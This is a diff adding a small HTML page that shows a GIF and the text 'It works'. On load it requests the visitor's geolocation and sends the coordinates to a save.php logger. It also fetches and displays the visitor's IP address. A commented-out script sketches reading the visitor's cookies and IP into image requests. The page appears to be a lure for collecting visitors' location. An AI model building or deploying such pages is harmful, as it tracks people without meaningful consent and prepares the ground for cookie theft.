@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{
+            min-height: 95vh;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            justify-content: center;
+        }
+        .countener{
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          width: 100%;
+          min-height: 90vh;
+        }
+        img{
+            box-shadow:  0px 0px 5px wheat;
+            border-radius: 5px;
+            width: 50%;
+        }
+    </style>
+</head>
+<body style="background-color: #111;" onload="getLocation()" id="body">
+  <div class="countener">
+    <img src="./giphy.gif" alt="">
+      <h1 id="h1" style="color: #aaa;text-shadow: 0 0 5px wheat;">
+          It works
+      </h1>
+  </div>  
+    <a href="www.google.com" style="display: none;" id="clicker">google</a>
+    <!-- <script>
+        // var i = document.cookie;
+        
+        // document.getElementById('body').innerHTML += `<img src='cookie = "${i}"' onerror=''>`;
+        // document.getElementById('body').innerHTML += `<img src='ip = "${data.ip}"' onerror=''>`;
+    </script> -->
+    <script>
+        var x = document.getElementById("h1");
+        
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+          } else { 
+            x.innerHTML = "Geolocation is not supported by this browser.";
+          }
+        }
+        
+        function showPosition(position) {
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => document.getElementById("h1").innerHTML += "<br>IP : " + data.ip);
+        
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET","save.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+        xhttp.send();
+            x.innerHTML = "Latitude: " + position.coords.latitude + 
+          "<br>Longitude: " + position.coords.longitude;
+        }
+        </script>
+</body>
+</html>
